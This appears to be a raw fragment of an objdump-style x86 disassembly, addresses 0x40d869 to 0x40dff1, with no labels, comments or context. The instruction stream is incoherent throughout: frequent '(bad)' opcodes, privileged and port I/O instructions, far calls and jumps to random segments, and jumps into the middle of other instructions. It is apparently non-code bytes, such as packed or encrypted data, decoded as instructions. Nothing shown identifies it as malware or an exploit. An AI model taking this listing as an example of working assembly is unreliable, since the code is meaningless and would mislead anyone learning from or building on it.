  40d869:	shl    DWORD PTR [edx-0x38],1
  40d86c:	pop    edi
  40d86d:	push   ebp
  40d86e:	pop    ss
  40d86f:	iret   
  40d870:	pop    esi
  40d871:	ins    BYTE PTR es:[edi],dx
  40d872:	stos   DWORD PTR es:[edi],eax
  40d873:	dec    esp
  40d874:	inc    BYTE PTR [esi]
  40d876:	cli    
  40d877:	lds    ebp,FWORD PTR [ebx]
  40d879:	fisttp QWORD PTR [edx+0x20]
  40d87c:	cmp    BYTE PTR [ecx+0x42ac50e],0x52
  40d883:	sub    DWORD PTR [ecx+0x34e7f85f],0x81e1fc0e
  40d88d:	mov    eax,ds:0x801af1e8
  40d892:	push   esp
  40d893:	sub    edx,DWORD PTR [ecx+0x57]
  40d896:	stos   DWORD PTR es:[edi],eax
  40d897:	sbb    cl,BYTE PTR [edx-0xef7412a]
  40d89d:	push   esi
  40d89e:	jae    0x40d904
  40d8a0:	push   es
  40d8a1:	(bad)  
  40d8a2:	pop    edx
  40d8a3:	or     BYTE PTR [esi],ah
  40d8a5:	in     al,dx
  40d8a6:	fisubr DWORD PTR [eax-0x14]
  40d8a9:	cdq    
  40d8aa:	push   cs
  40d8ab:	retf   0x1f21
  40d8ae:	inc    ebp
  40d8af:	push   esp
  40d8b0:	or     ebx,ebx
  40d8b2:	adc    al,0xc7
  40d8b4:	mov    ch,0xb0
  40d8b6:	stos   BYTE PTR es:[edi],al
  40d8b7:	aaa    
  40d8b8:	popf   
  40d8b9:	lahf   
  40d8ba:	xchg   ecx,eax
  40d8bb:	stos   BYTE PTR es:[edi],al
  40d8bc:	inc    ebp
  40d8bd:	sar    esp,cl
  40d8bf:	inc    ebp
  40d8c0:	jl     0x40d8c0
  40d8c2:	loope  0x40d851
  40d8c4:	out    0x2e,eax
  40d8c6:	ds enter 0xeb21,0x37
  40d8cb:	cmp    edi,eax
  40d8cd:	adc    eax,0xdaf4695b
  40d8d2:	mov    esi,0x4e5f3bd3
  40d8d7:	sbb    eax,0xdda420c6
  40d8dc:	je     0x40d92a
  40d8de:	add    al,0xf9
  40d8e0:	jp     0x40d8c1
  40d8e2:	sub    eax,0xb5af5d52
  40d8e7:	loopne 0x40d8c7
  40d8e9:	dec    esi
  40d8ea:	dec    ecx
  40d8eb:	enter  0xf111,0x4a
  40d8ef:	lods   eax,DWORD PTR ds:[esi]
  40d8f0:	std    
  40d8f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8f2:	dec    ebp
  40d8f3:	fstp   QWORD PTR [esi-0x1067feb]
  40d8f9:	inc    edi
  40d8fa:	out    dx,al
  40d8fb:	xchg   ebx,eax
  40d8fc:	arpl   WORD PTR [esi+esi*8],sp
  40d8ff:	fucomp st(2)
  40d901:	add    bh,al
  40d903:	mov    ebp,esi
  40d905:	add    edx,ebx
  40d907:	call   FWORD PTR [esi+esi*1+0x3a53c92b]
  40d90e:	sub    al,0xaf
  40d910:	sub    eax,0x33333d8b
  40d915:	mov    gs,WORD PTR [ecx+0x4ccbe04e]
  40d91b:	dec    eax
  40d91c:	cmp    DWORD PTR [ebx-0x25cbe1fa],esp
  40d922:	xor    ah,BYTE PTR [ebx-0x681c200d]
  40d928:	(bad)  
  40d929:	leave  
  40d92a:	sbb    ecx,DWORD PTR [ebp+0x76]
  40d92d:	ja     0x40d8c8
  40d92f:	xchg   esi,eax
  40d930:	in     eax,dx
  40d931:	mov    eax,ds:0x3fa7b2c0
  40d936:	mov    al,ds:0x352d1799
  40d93b:	enter  0x294a,0xad
  40d93f:	xor    BYTE PTR [esi-0x41e393],ch
  40d945:	xchg   ecx,eax
  40d946:	jo     0x40d926
  40d948:	push   0xfffffffb
  40d94a:	xchg   edx,eax
  40d94b:	test   al,0x9d
  40d94d:	xchg   ebp,edx
  40d94f:	xchg   edi,eax
  40d950:	mov    al,0xdf
  40d952:	in     eax,dx
  40d953:	jl     0x40d8f9
  40d955:	pop    ds
  40d956:	xchg   esi,eax
  40d957:	(bad)  
  40d958:	rol    BYTE PTR [ecx-0x62c17c0d],cl
  40d95e:	mov    ch,0x8
  40d960:	push   ds
  40d961:	daa    
  40d962:	dec    ecx
  40d963:	and    DWORD PTR [esi],esp
  40d965:	fimul  WORD PTR [edx+0xbc8093c]
  40d96b:	push   es
  40d96c:	push   esp
  40d96d:	inc    DWORD PTR [ecx]
  40d96f:	mov    ebx,ebp
  40d971:	pop    ecx
  40d972:	test   eax,0x619534e9
  40d977:	cwde   
  40d978:	iret   
  40d979:	jmp    0xd3d7:0xdfc9d749
  40d980:	mov    ebx,0xff14f9d9
  40d985:	mov    eax,0xeabda82
  40d98a:	inc    ebx
  40d98b:	sbb    BYTE PTR [edi],0x97
  40d98e:	add    eax,0x3ed98340
  40d993:	aad    0xa
  40d995:	push   0xffffff80
  40d997:	aaa    
  40d998:	arpl   WORD PTR [ebp+0x76],cx
  40d99b:	or     edi,ecx
  40d99d:	daa    
  40d99e:	jp     0x40d96b
  40d9a0:	out    0x1f,al
  40d9a2:	and    al,0xe2
  40d9a4:	enter  0xaceb,0xa7
  40d9a8:	xchg   edx,eax
  40d9a9:	call   0x4c22:0x9916c7e9
  40d9b0:	icebp  
  40d9b1:	pushf  
  40d9b2:	jle    0x40da33
  40d9b4:	in     eax,dx
  40d9b5:	cmp    eax,0x3e1b5296
  40d9ba:	pop    ebp
  40d9bb:	lds    edx,FWORD PTR [edx]
  40d9bd:	cwde   
  40d9be:	mov    ah,0x3a
  40d9c0:	jmp    0xa6aaa5a4
  40d9c5:	loopne 0x40da0d
  40d9c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9c8:	ror    BYTE PTR ds:0xdca978e3,cl
  40d9ce:	sbb    al,0x6
  40d9d0:	lods   al,BYTE PTR ds:[esi]
  40d9d1:	jns    0x40d9a9
  40d9d3:	dec    edi
  40d9d4:	or     eax,0x73c8ba85
  40d9d9:	xchg   ebx,eax
  40d9da:	pop    ebp
  40d9db:	ins    BYTE PTR es:[edi],dx
  40d9dc:	adc    edx,DWORD PTR [ebx]
  40d9de:	push   ds
  40d9df:	out    dx,al
  40d9e0:	pop    ss
  40d9e1:	mov    bh,dh
  40d9e3:	or     edx,DWORD PTR [esi+0x3cff7ebc]
  40d9e9:	(bad)  
  40d9ea:	lds    esp,FWORD PTR [ecx+0x77]
  40d9ed:	in     eax,dx
  40d9ee:	adc    al,0xcd
  40d9f0:	and    ebx,ebp
  40d9f2:	data16 fsubr st(7),st
  40d9f5:	push   0x7d
  40d9f7:	push   DWORD PTR [esi-0x9]
  40d9fa:	inc    ebx
  40d9fb:	int3   
  40d9fc:	jmp    0x40da0c
  40d9fe:	lods   eax,DWORD PTR ds:[esi]
  40d9ff:	inc    edi
  40da00:	in     al,0x7d
  40da02:	shl    DWORD PTR [edx-0x23132008],cl
  40da08:	int3   
  40da09:	mov    al,0x2b
  40da0b:	cmp    al,0x20
  40da0d:	xchg   ecx,eax
  40da0e:	sub    eax,0x3b30ebb4
  40da13:	or     eax,0x77f69626
  40da18:	add    al,0xe0
  40da1a:	add    edi,edi
  40da1c:	in     al,0x3
  40da1e:	lea    edi,[ebx+esi*1-0x56]
  40da22:	cld    
  40da23:	pop    ds
  40da24:	aaa    
  40da25:	xor    DWORD PTR [ebx+0x455c7ce8],0xffffffc8
  40da2c:	sub    ah,bh
  40da2e:	sbb    BYTE PTR ds:0x5c384f1d,dl
  40da34:	out    0xf7,al
  40da36:	xchg   esp,eax
  40da37:	je     0x40da43
  40da39:	inc    esi
  40da3a:	mov    ebp,0xd1bf52d7
  40da3f:	(bad)  
  40da40:	fidivr WORD PTR [eax+edx*4-0x64b5615e]
  40da47:	mov    dh,0xeb
  40da49:	dec    edi
  40da4a:	xchg   BYTE PTR [edx+0x78],cl
  40da4d:	clc    
  40da4e:	and    esp,0x374fdeb4
  40da54:	outs   dx,BYTE PTR ds:[esi]
  40da55:	or     ecx,DWORD PTR [eax+0x4b27abe7]
  40da5b:	adc    ch,bl
  40da5d:	icebp  
  40da5e:	sub    bh,BYTE PTR [edi+0x34f41f87]
  40da64:	sub    bl,bh
  40da66:	inc    esp
  40da67:	(bad)  
  40da68:	sahf   
  40da69:	jno    0x40dadc
  40da6b:	cmp    bh,cl
  40da6d:	dec    edi
  40da6e:	shl    DWORD PTR [edx+0x1e],1
  40da71:	jnp    0x40da59
  40da73:	(bad)  
  40da74:	ins    DWORD PTR es:[edi],dx
  40da75:	inc    ebp
  40da76:	fisttp DWORD PTR [edi-0x35f86bdd]
  40da7c:	mov    al,ch
  40da7e:	push   esi
  40da7f:	xor    eax,0x4b9d7479
  40da84:	dec    edi
  40da85:	fwait
  40da86:	dec    esp
  40da87:	daa    
  40da88:	dec    esp
  40da89:	mov    dh,0xff
  40da8b:	in     al,0x91
  40da8d:	les    esp,FWORD PTR [edx+0x1f47befa]
  40da93:	shl    bh,1
  40da95:	fcomip st,st(7)
  40da97:	addr16 push ds
  40da99:	xchg   edi,eax
  40da9a:	xor    al,BYTE PTR [ecx+0x6ee52a1a]
  40daa0:	sub    ebx,DWORD PTR [edi+0x21]
  40daa3:	fst    QWORD PTR [ebp+0x7654a118]
  40daa9:	addr16 (bad) 
  40daab:	enter  0xeedf,0x10
  40daaf:	call   0x5ceb:0x5e2a7ae8
  40dab6:	mov    ds:0xe0354784,al
  40dabb:	adc    al,0x25
  40dabd:	fbstp  TBYTE PTR [eax-0x75661abc]
  40dac3:	pushf  
  40dac4:	test   al,0x31
  40dac6:	add    BYTE PTR [ebp+0x61],dh
  40dac9:	and    al,0x56
  40dacb:	out    dx,eax
  40dacc:	mov    bh,0x87
  40dace:	jb     0x40db22
  40dad0:	enter  0xeadf,0xe
  40dad4:	sti    
  40dad5:	mov    eax,0xef01b439
  40dada:	cld    
  40dadb:	pushf  
  40dadc:	loop   0x40dab5
  40dade:	mov    dl,0x4
  40dae0:	mov    edi,0x1cc8299f
  40dae5:	add    esi,ecx
  40dae7:	dec    esi
  40dae8:	cmp    cl,bl
  40daea:	ret    0xeb12
  40daed:	adc    DWORD PTR [ebx-0x8],esi
  40daf0:	add    al,0xf7
  40daf2:	clc    
  40daf3:	sub    eax,0xd4200b06
  40daf8:	imul   ebp,ebx,0x3f
  40dafb:	mov    ds:0x30f0f238,al
  40db00:	jmp    0x40db7f
  40db02:	jg     0x40dabc
  40db04:	jno    0x40daf6
  40db06:	add    al,0x3c
  40db08:	and    eax,0xf052dadf
  40db0d:	jbe    0x40dace
  40db0f:	fld    QWORD PTR [esi+0x3cbafd16]
  40db15:	sub    al,0xd5
  40db17:	scas   al,BYTE PTR es:[edi]
  40db18:	mov    BYTE PTR [ebp+eax*4-0x38],ah
  40db1c:	xor    ch,BYTE PTR [ecx+0x71]
  40db1f:	test   DWORD PTR ds:0xebfd9bf0,0x13ebefea
  40db29:	outs   dx,DWORD PTR ds:[esi]
  40db2a:	call   0xcde5:0x2cdf4ab9
  40db31:	pop    ds
  40db32:	ficom  WORD PTR [ebp-0x6f]
  40db35:	pop    eax
  40db36:	std    
  40db37:	add    bl,al
  40db39:	xor    eax,0x884d59fb
  40db3e:	pop    edx
  40db3f:	into   
  40db40:	inc    esi
  40db41:	add    eax,DWORD PTR ds:0xefccbe5
  40db47:	outs   dx,DWORD PTR ds:[esi]
  40db48:	or     eax,0xa049fce8
  40db4d:	mov    ah,0x3f
  40db4f:	jge    0x40db0a
  40db51:	mov    esi,0xd89e24cf
  40db56:	push   esp
  40db57:	mov    esi,0x1cbd256b
  40db5c:	cdq    
  40db5d:	mov    bl,0xb1
  40db5f:	stc    
  40db60:	jmp    0x40dbbd
  40db62:	mov    WORD PTR [ecx-0x7f886bca],?
  40db68:	hlt    
  40db69:	add    al,0xa8
  40db6b:	iret   
  40db6c:	ins    BYTE PTR es:[edi],dx
  40db6d:	mov    al,0x9c
  40db6f:	call   0x7b2a:0x87d0c73
  40db76:	test   BYTE PTR [edi+0x4b49a2c0],0x59
  40db7d:	imul   eax,DWORD PTR [eax+0x10],0x10
  40db81:	pop    ebx
  40db82:	outs   dx,DWORD PTR ds:[esi]
  40db83:	enter  0x2c42,0xf9
  40db87:	cdq    
  40db88:	arpl   bp,si
  40db8a:	mov    ds:0x301beb82,eax
  40db8f:	int3   
  40db90:	gs nop
  40db92:	mov    bl,0x3e
  40db94:	or     eax,0xaa8a7cdf
  40db99:	adc    eax,0x65b08e94
  40db9e:	std    
  40db9f:	int3   
  40dba0:	lods   al,BYTE PTR ds:[esi]
  40dba1:	test   eax,0x2cd142c
  40dba6:	sbb    esi,0xffffffc3
  40dba9:	jp     0x40dc28
  40dbab:	lds    ecx,FWORD PTR [ebp+0x16]
  40dbae:	neg    BYTE PTR [eax-0x7d]
  40dbb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbb2:	cld    
  40dbb3:	mul    ebp
  40dbb5:	dec    ebp
  40dbb6:	xchg   edi,eax
  40dbb7:	loope  0x40dbd3
  40dbb9:	ins    BYTE PTR es:[edi],dx
  40dbba:	jmp    0xd46a586
  40dbbf:	xor    esp,DWORD PTR [ecx-0x16573b9]
  40dbc5:	pop    ecx
  40dbc6:	call   0x194d:0x63c0ab8a
  40dbcd:	cmp    BYTE PTR [ecx-0x2f],bl
  40dbd0:	jl     0x40dc39
  40dbd2:	in     eax,dx
  40dbd3:	and    ebp,ebx
  40dbd5:	sbb    bh,BYTE PTR [esi-0x3003d93]
  40dbdb:	mov    dh,BYTE PTR [esp+ebp*1-0x7bfa042a]
  40dbe2:	cmp    ecx,eax
  40dbe4:	jl     0x40dc10
  40dbe6:	xchg   ecx,eax
  40dbe7:	xor    BYTE PTR [eax-0x20],dh
  40dbea:	sar    DWORD PTR [esi-0x15],1
  40dbed:	dec    ebp
  40dbee:	sub    ecx,0x14875ca3
  40dbf4:	jae    0x40dbd4
  40dbf6:	les    esp,FWORD PTR [eax]
  40dbf8:	enter  0x16a9,0xf9
  40dbfc:	fstp   QWORD PTR [edx]
  40dbfe:	lea    ebp,[eax+0x56fccf8d]
  40dc04:	jge    0x40dbcb
  40dc06:	sbb    al,0x5a
  40dc08:	cwde   
  40dc09:	add    eax,0x75c5bbdc
  40dc0e:	cmp    eax,0x2f7b8a88
  40dc13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc14:	rol    DWORD PTR [esi-0x3],cl
  40dc17:	mov    ds:0xe8d23af6,eax
  40dc1c:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40dc1e:	xchg   al,cl
  40dc20:	mov    ah,0xb4
  40dc22:	adc    al,0xd8
  40dc24:	(bad)  
  40dc25:	test   eax,0xc5ebcd3f
  40dc2a:	das    
  40dc2b:	add    ecx,edx
  40dc2d:	inc    eax
  40dc2e:	adc    edx,DWORD PTR [ebx+0xbe9d695]
  40dc34:	jo     0x40dc23
  40dc36:	jns    0x40dc11
  40dc38:	loope  0x40dc99
  40dc3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc3b:	dec    edx
  40dc3c:	adc    edi,DWORD PTR [eax-0x3]
  40dc3f:	arpl   sp,dx
  40dc41:	call   0xbe53:0x4a37c7ac
  40dc48:	aas    
  40dc49:	mov    al,0xee
  40dc4b:	cmp    ebx,DWORD PTR [edi+ebx*1]
  40dc4e:	loopne 0x40dcb2
  40dc50:	push   ebp
  40dc51:	push   esi
  40dc52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc53:	bnd jmp 0x40dc1e
  40dc56:	nop
  40dc57:	mov    DWORD PTR [edx],eax
  40dc59:	jnp    0x40dc86
  40dc5b:	mov    WORD PTR [eax],ss
  40dc5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc5e:	pop    ecx
  40dc5f:	or     ebx,ebp
  40dc61:	(bad)  
  40dc62:	pop    ss
  40dc63:	mov    ecx,0xca370e51
  40dc68:	sbb    eax,0xfd16fcf7
  40dc6d:	cli    
  40dc6e:	je     0x40dc36
  40dc70:	out    0x55,eax
  40dc72:	repz shl BYTE PTR [ebp+0x6663708d],cl
  40dc79:	in     al,0x7b
  40dc7b:	push   0x578d2357
  40dc80:	add    eax,0x1d02fd6b
  40dc85:	lahf   
  40dc86:	enter  0x747d,0x96
  40dc8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc8b:	shl    DWORD PTR [edi-0x14ae29c6],1
  40dc91:	xor    al,0x25
  40dc93:	push   edi
  40dc94:	sbb    edi,DWORD PTR [esp+edi*8-0x41dc8c5d]
  40dc9b:	or     eax,0xc83bfa7b
  40dca0:	pop    ecx
  40dca1:	jae    0x40dcaf
  40dca3:	sub    esp,DWORD PTR [edx-0x149e5a9a]
  40dca9:	mov    ds:0x63435ca9,al
  40dcae:	rcr    DWORD PTR [ebp-0x31cf27ef],0x83
  40dcb5:	nop
  40dcb6:	pushf  
  40dcb7:	push   cs
  40dcb8:	xchg   BYTE PTR [edi+0x67],bh
  40dcbb:	push   ebx
  40dcbc:	mov    eax,0x71befd3d
  40dcc1:	inc    eax
  40dcc2:	fisub  WORD PTR [edi+0x16]
  40dcc5:	(bad)  
  40dcc6:	and    ecx,eax
  40dcc8:	test   DWORD PTR [edi],esp
  40dcca:	gs mov ebx,0x4517815
  40dcd0:	jmp    0x88a8:0xc9183fe0
  40dcd7:	adc    BYTE PTR [edx-0x79377aee],al
  40dcdd:	cmp    al,BYTE PTR [ebx-0x67]
  40dce0:	mov    esi,edx
  40dce2:	jbe    0x40dc74
  40dce4:	call   0xa5c34d2b
  40dce9:	inc    esp
  40dcea:	add    ch,dh
  40dcec:	ja     0x40dcb4
  40dcee:	dec    esp
  40dcef:	and    BYTE PTR [eax],bl
  40dcf1:	pushf  
  40dcf2:	and    eax,ecx
  40dcf4:	retf   0x3868
  40dcf7:	retf   
  40dcf8:	shr    edi,1
  40dcfa:	pusha  
  40dcfb:	hlt    
  40dcfc:	arpl   WORD PTR [esi],bp
  40dcfe:	std    
  40dcff:	or     BYTE PTR [eax-0x22b27e97],0x39
  40dd06:	test   edi,eax
  40dd08:	(bad)  
  40dd09:	adc    DWORD PTR [eax],edx
  40dd0b:	fcom   QWORD PTR [ebx+0x4c7249bf]
  40dd11:	ins    DWORD PTR es:[edi],dx
  40dd12:	sub    al,0x2a
  40dd14:	repnz sahf 
  40dd16:	dec    esp
  40dd17:	int3   
  40dd18:	fcomp  DWORD PTR [edi-0x25]
  40dd1b:	mov    cl,0xb2
  40dd1d:	mov    esp,0xe69fc87b
  40dd22:	jae    0x40dd64
  40dd24:	xchg   edx,eax
  40dd25:	push   0x3beb4a28
  40dd2a:	repz mov dh,0x5a
  40dd2d:	pop    esp
  40dd2e:	cmp    al,0xe7
  40dd30:	popa   
  40dd31:	fld    DWORD PTR [esi+0x2]
  40dd34:	into   
  40dd35:	xchg   esi,eax
  40dd36:	mov    esp,0x14de6047
  40dd3b:	mov    edi,0xf5e017eb
  40dd40:	sub    ch,BYTE PTR [eax]
  40dd42:	mov    ebp,0xd835491c
  40dd47:	(bad)  
  40dd48:	jge    0x40dccc
  40dd4a:	mov    esi,0x1d660a9d
  40dd4f:	and    ebx,ebp
  40dd51:	adc    esp,edx
  40dd53:	scas   eax,DWORD PTR es:[edi]
  40dd54:	mov    edx,0x9452153
  40dd59:	fistp  QWORD PTR [eax+0xb]
  40dd5c:	test   eax,0x7df847c9
  40dd61:	pop    edi
  40dd62:	loope  0x40dd7a
  40dd64:	jle    0x40ddc5
  40dd66:	aam    0xbb
  40dd68:	nop
  40dd69:	retf   0xa7c2
  40dd6c:	in     al,0xe0
  40dd6e:	xchg   DWORD PTR [edx+0x25],esi
  40dd71:	std    
  40dd72:	ss cmc 
  40dd74:	pop    ebp
  40dd75:	pop    edi
  40dd76:	inc    edi
  40dd77:	cmp    BYTE PTR [ebx-0x58],ch
  40dd7a:	cld    
  40dd7b:	mov    esi,0xa6914c61
  40dd80:	pushf  
  40dd81:	fldcw  WORD PTR [ebx-0x55bf1038]
  40dd87:	adc    BYTE PTR [edx-0x140d8f62],cl
  40dd8d:	retf   0x4b94
  40dd90:	rcr    BYTE PTR [edi+0x55],cl
  40dd93:	push   ebp
  40dd94:	into   
  40dd95:	fistp  WORD PTR [ebp+0x69743177]
  40dd9b:	pop    eax
  40dd9c:	sbb    DWORD PTR [edi*8+0x67c96d4b],0x51
  40dda4:	push   cs
  40dda5:	pop    esp
  40dda6:	and    cl,al
  40dda8:	sti    
  40dda9:	popf   
  40ddaa:	stos   DWORD PTR es:[edi],eax
  40ddab:	sbb    ebx,DWORD PTR [edi+0x69]
  40ddae:	adc    BYTE PTR [eax+eiz*4-0x3],ch
  40ddb2:	cmc    
  40ddb3:	shr    DWORD PTR [eax+ebp*8],cl
  40ddb6:	rol    bh,1
  40ddb8:	bound  esi,QWORD PTR [edi-0x6b]
  40ddbb:	jnp    0x40de25
  40ddbd:	or     cl,BYTE PTR [eax+0x59]
  40ddc0:	imul   edx,DWORD PTR [eax],0x3d
  40ddc3:	adc    al,al
  40ddc5:	jns    0x40dd59
  40ddc7:	dec    esi
  40ddc8:	out    0xb8,eax
  40ddca:	sub    eax,0x7d531fbc
  40ddcf:	sbb    al,0x9e
  40ddd1:	inc    edi
  40ddd2:	cmc    
  40ddd3:	mov    ds:0xc2b5df47,al
  40ddd8:	mov    BYTE PTR [eax],dh
  40ddda:	push   edi
  40dddb:	js     0x40dd6a
  40dddd:	ja     0x40dddc
  40dddf:	sbb    edx,DWORD PTR [edx-0x3e88c77a]
  40dde5:	aad    0x57
  40dde7:	fild   WORD PTR [ebp+0xa]
  40ddea:	std    
  40ddeb:	dec    ebx
  40ddec:	push   0xb857af82
  40ddf1:	lock sub eax,0x46f4eb5c
  40ddf7:	popf   
  40ddf8:	adc    eax,0xddfb2a81
  40ddfd:	loop   0x40de02
  40ddff:	cmc    
  40de00:	inc    edx
  40de01:	(bad)  
  40de03:	inc    edi
  40de04:	xor    DWORD PTR [eax-0x74],esp
  40de07:	inc    eax
  40de08:	out    0x84,al
  40de0a:	push   cs
  40de0b:	std    
  40de0c:	mov    WORD PTR [ebx-0x63],ds
  40de0f:	mov    BYTE PTR [edi+0x54],0x56
  40de13:	enter  0x7328,0x92
  40de17:	pusha  
  40de18:	xlat   BYTE PTR ds:[ebx]
  40de19:	jle    0x40dd9b
  40de1b:	xchg   bl,ch
  40de1d:	in     al,0x86
  40de1f:	mov    edi,DWORD PTR [ecx]
  40de21:	ds retf 
  40de23:	xchg   DWORD PTR [ebx-0x21],eax
  40de26:	push   eax
  40de27:	fst    DWORD PTR [edx]
  40de29:	adc    BYTE PTR [ebp+0x32e8066],bh
  40de2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de30:	out    dx,al
  40de31:	mov    WORD PTR [ebp-0x61],?
  40de34:	int    0x30
  40de36:	(bad)  
  40de37:	jmp    0xf8cfbd06
  40de3c:	xchg   ebp,eax
  40de3d:	pop    edi
  40de3e:	fisttp DWORD PTR [ecx+0x2de5bfc8]
  40de44:	jmp    0x40de1f
  40de46:	jecxz  0x40de88
  40de48:	pop    esp
  40de49:	xlat   BYTE PTR ds:[ebx]
  40de4a:	in     al,0xe7
  40de4c:	xor    eax,ecx
  40de4e:	mov    esi,0x2adca598
  40de53:	pop    ds
  40de54:	imul   ebp,DWORD PTR [eax-0x39],0x6c334b92
  40de5b:	mov    dh,0xeb
  40de5d:	(bad)  
  40de5e:	mov    dl,0x67
  40de60:	push   ebx
  40de61:	test   DWORD PTR [edx-0x65],ebp
  40de64:	mov    edx,0x908797df
  40de69:	sub    ebp,DWORD PTR [eax-0x39]
  40de6c:	test   eax,0xe86efd45
  40de71:	jo     0x40dec9
  40de73:	cmc    
  40de74:	cs out 0x8a,eax
  40de77:	enter  0x3d9b,0x0
  40de7b:	dec    ebp
  40de7c:	inc    eax
  40de7d:	and    eax,0x48ebc3a3
  40de82:	inc    ebx
  40de83:	lahf   
  40de84:	ror    esi,cl
  40de86:	jp     0x40dec8
  40de88:	ins    BYTE PTR es:[edi],dx
  40de89:	aam    0xec
  40de8b:	cmp    ebp,edx
  40de8d:	nop
  40de8e:	sbb    BYTE PTR [ecx+0x5eb4dd48],0xd
  40de95:	pop    eax
  40de96:	std    
  40de97:	adc    eax,DWORD PTR [ecx-0x173b8cf]
  40de9d:	push   es
  40de9e:	jb     0x40de68
  40dea0:	push   0xffffff93
  40dea2:	and    al,0x6
  40dea4:	retf   0xe3a
  40dea7:	shr    bl,1
  40dea9:	inc    eax
  40deaa:	cld    
  40deab:	xchg   bl,ah
  40dead:	in     eax,dx
  40deae:	repz cmp DWORD PTR [edi+0x27f7a7dc],edi
  40deb5:	(bad)  
  40deb6:	bound  eax,QWORD PTR [ebx+0x6f6b247b]
  40debc:	mov    bl,0xe0
  40debe:	fmul   st,st(2)
  40dec0:	and    al,0xa1
  40dec2:	enter  0xb5e6,0x5f
  40dec6:	dec    edi
  40dec7:	mov    al,0x86
  40dec9:	fild   QWORD PTR [esi]
  40decb:	pop    edx
  40decc:	rcr    BYTE PTR [esi+0x7980d906],1
  40ded2:	std    
  40ded3:	pusha  
  40ded4:	jo     0x40df38
  40ded6:	popf   
  40ded7:	pop    ebx
  40ded8:	mov    bh,0x37
  40deda:	fadd   st(7),st
  40dedc:	push   esi
  40dedd:	or     edx,DWORD PTR [esi+edi*2-0x12891384]
  40dee4:	jmp    0x40de78
  40dee6:	inc    edx
  40dee7:	out    0xd2,al
  40dee9:	pop    ecx
  40deea:	adc    edi,DWORD PTR [edi]
  40deec:	pop    esi
  40deed:	fucomip st,st(7)
  40deef:	test   al,0x86
  40def1:	shr    DWORD PTR [ecx-0x5cc594d7],1
  40def7:	sbb    al,0xeb
  40def9:	jmp    DWORD PTR [ecx-0x35]
  40defc:	outs   dx,DWORD PTR ds:[esi]
  40defd:	mov    cl,0xd0
  40deff:	scas   al,BYTE PTR es:[edi]
  40df00:	mov    eax,0x9891bd9
  40df05:	pushf  
  40df06:	jl     0x40df69
  40df08:	jb     0x40df7b
  40df0a:	inc    esp
  40df0b:	data16 inc BYTE PTR [eax+0x8]
  40df0f:	xchg   ecx,eax
  40df10:	jmp    0x40df4b
  40df12:	xchg   dl,bh
  40df14:	shl    DWORD PTR [ebx-0x69],1
  40df17:	enter  0xec6c,0xc6
  40df1b:	mov    al,0x19
  40df1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df1e:	mov    edi,0xd61f1e7f
  40df23:	ds jmp 0x40df86
  40df26:	cmp    ebp,ecx
  40df28:	(bad)  
  40df29:	or     BYTE PTR [ebp+0x7d],bh
  40df2c:	(bad)  
  40df2d:	lock aaa 
  40df2f:	gs in  al,0xdf
  40df32:	ins    BYTE PTR es:[edi],dx
  40df33:	test   DWORD PTR [esi+0xd8053b2],ebp
  40df39:	add    al,0x2f
  40df3b:	sbb    eax,0xf71f12eb
  40df40:	imul   esi,DWORD PTR [ebx-0x27],0xc9ded9b5
  40df47:	sub    eax,0x15e986f9
  40df4c:	push   ds
  40df4d:	das    
  40df4e:	sbb    esp,edx
  40df50:	jmp    0x40dee8
  40df52:	mov    bh,0x30
  40df54:	gs aas 
  40df56:	cs cs lock icebp 
  40df5a:	jae    0x40dfd6
  40df5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df5d:	fmulp  st(2),st
  40df5f:	fcom   st(3)
  40df61:	xchg   ebx,eax
  40df62:	das    
  40df63:	or     eax,0xfdfcf46
  40df68:	jmp    0x40dfe3
  40df6a:	test   BYTE PTR [ecx],0x80
  40df6d:	loopne 0x40defb
  40df6f:	punpcklbw mm3,mm7
  40df72:	fcom   DWORD PTR [edx-0x5]
  40df75:	gs xchg ebp,eax
  40df77:	push   edi
  40df78:	mov    bh,0x5b
  40df7a:	add    ebx,ebp
  40df7c:	aaa    
  40df7d:	cmp    al,BYTE PTR [eax]
  40df7f:	xchg   ecx,eax
  40df80:	push   es
  40df81:	ja     0x40dfcf
  40df83:	add    BYTE PTR ds:0xecc7df22,bh
  40df89:	pop    es
  40df8a:	mov    ebp,0xb87eeda7
  40df8f:	cld    
  40df90:	jmp    0x40df32
  40df92:	adc    al,0x4e
  40df94:	pop    esp
  40df95:	lock es das 
  40df98:	dec    edi
  40df99:	call   0x9f9efeb0
  40df9e:	shr    al,1
  40dfa0:	mov    bl,0xbe
  40dfa2:	mov    bl,0x38
  40dfa4:	out    0x30,al
  40dfa6:	add    ecx,edx
  40dfa8:	push   ebx
  40dfa9:	mov    al,ds:0xca216722
  40dfae:	pop    esp
  40dfaf:	ss jge 0x40df72
  40dfb2:	std    
  40dfb3:	(bad)  
  40dfb4:	jo     0x40dfc9
  40dfb6:	dec    edi
  40dfb7:	lock add edx,DWORD PTR [eax+esi*8+0x285beb36]
  40dfbf:	popa   
  40dfc0:	cdq    
  40dfc1:	adc    al,0x3
  40dfc3:	jecxz  0x40e03d
  40dfc5:	add    ebp,DWORD PTR [edx-0x55]
  40dfc8:	loop   0x40dfa9
  40dfca:	fwait
  40dfcb:	mov    eax,ds:0x3de99122
  40dfd0:	jmp    0x40dfb5
  40dfd2:	dec    eax
  40dfd3:	and    al,0x99
  40dfd5:	inc    esi
  40dfd6:	adc    BYTE PTR [esi],0x4
  40dfd9:	fstp   DWORD PTR [eax+0x7d]
  40dfdc:	xchg   esi,ebx
  40dfde:	sbb    al,0x99
  40dfe0:	push   edx
  40dfe1:	scas   eax,DWORD PTR es:[edi]
  40dfe2:	adc    DWORD PTR [edi+0x68da9fee],ebx
  40dfe8:	adc    bh,BYTE PTR [edi]
  40dfea:	popa   
  40dfeb:	inc    edi
  40dfec:	mov    edi,0x9bc86842
  40dff1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
